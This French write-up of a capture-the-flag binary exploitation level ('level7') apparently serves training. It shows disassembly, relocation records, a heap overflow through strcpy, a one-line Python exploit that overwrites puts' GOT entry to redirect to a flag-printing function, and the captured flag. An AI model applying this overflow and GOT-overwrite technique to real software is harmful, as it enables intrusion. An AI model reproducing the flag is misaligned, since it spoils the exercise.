## Démarches

- `objdump -d level7`
```
    08048521 <main>:
        8048521:	55                   	push   %ebp
        8048522:	89 e5                	mov    %esp,%ebp
        8048524:	83 e4 f0             	and    $0xfffffff0,%esp
        8048527:	83 ec 20             	sub    $0x20,%esp
        804852a:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
        8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
        8048536:	89 44 24 1c          	mov    %eax,0x1c(%esp)
        804853a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        804853e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
        8048544:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
        804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
        8048550:	89 c2                	mov    %eax,%edx
        8048552:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        8048556:	89 50 04             	mov    %edx,0x4(%eax)
        8048559:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
        8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
        8048565:	89 44 24 18          	mov    %eax,0x18(%esp)
        8048569:	8b 44 24 18          	mov    0x18(%esp),%eax
        804856d:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
        8048573:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
        804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
        804857f:	89 c2                	mov    %eax,%edx
        8048581:	8b 44 24 18          	mov    0x18(%esp),%eax
        8048585:	89 50 04             	mov    %edx,0x4(%eax)
        8048588:	8b 45 0c             	mov    0xc(%ebp),%eax
        804858b:	83 c0 04             	add    $0x4,%eax
        804858e:	8b 00                	mov    (%eax),%eax
        8048590:	89 c2                	mov    %eax,%edx
        8048592:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        8048596:	8b 40 04             	mov    0x4(%eax),%eax
        8048599:	89 54 24 04          	mov    %edx,0x4(%esp)
        804859d:	89 04 24             	mov    %eax,(%esp)
        80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
        80485a5:	8b 45 0c             	mov    0xc(%ebp),%eax
        80485a8:	83 c0 08             	add    $0x8,%eax
        80485ab:	8b 00                	mov    (%eax),%eax
        80485ad:	89 c2                	mov    %eax,%edx
        80485af:	8b 44 24 18          	mov    0x18(%esp),%eax
        80485b3:	8b 40 04             	mov    0x4(%eax),%eax
        80485b6:	89 54 24 04          	mov    %edx,0x4(%esp)
        80485ba:	89 04 24             	mov    %eax,(%esp)
        80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
        80485c2:	ba e9 86 04 08       	mov    $0x80486e9,%edx
        80485c7:	b8 eb 86 04 08       	mov    $0x80486eb,%eax
        80485cc:	89 54 24 04          	mov    %edx,0x4(%esp)
        80485d0:	89 04 24             	mov    %eax,(%esp)
        80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
        80485d8:	89 44 24 08          	mov    %eax,0x8(%esp)
        80485dc:	c7 44 24 04 44 00 00 	movl   $0x44,0x4(%esp)
        80485e3:	00
        80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp)
        80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
        80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp)
        80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
        80485fc:	b8 00 00 00 00       	mov    $0x0,%eax
        8048601:	c9                   	leave
        8048602:	c3                   	ret

    080484f4 <m>:
        80484f4:	55                   	push   %ebp
        80484f5:	89 e5                	mov    %esp,%ebp
        80484f7:	83 ec 18             	sub    $0x18,%esp
        80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
        8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
        8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
        804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
        804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
        8048516:	08
        8048517:	89 14 24             	mov    %edx,(%esp)
        804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
        804851f:	c9                   	leave
        8048520:	c3                   	ret
```

`objdump -R level7`
    
```
    level7:     file format elf32-i386

    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE
    08049904 R_386_GLOB_DAT    __gmon_start__
    08049914 R_386_JUMP_SLOT   printf
    08049918 R_386_JUMP_SLOT   fgets
    0804991c R_386_JUMP_SLOT   time
    08049920 R_386_JUMP_SLOT   strcpy
    08049924 R_386_JUMP_SLOT   malloc
    08049928 R_386_JUMP_SLOT   puts
    0804992c R_386_JUMP_SLOT   __gmon_start__
    08049930 R_386_JUMP_SLOT   __libc_start_main
    08049934 R_386_JUMP_SLOT   fopen
```

- Le programme utilise strcpy pour copier les arguments
- Avec gdb + peda, on peut déterminer que la taille du buffer est 20

- Comme dans les levels précédents, on utilise le jump d'une fonction utilisée (ici *puts* à l'adresse *08049928*) en y réécrivant l'adresse de destination (la fonction `m` à l'adresse *080484f4*)
- `./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08"+" "+"\xf4\x84\x04\x08")')`
  > 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1602077241
<br>
----
## Ressources
- http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf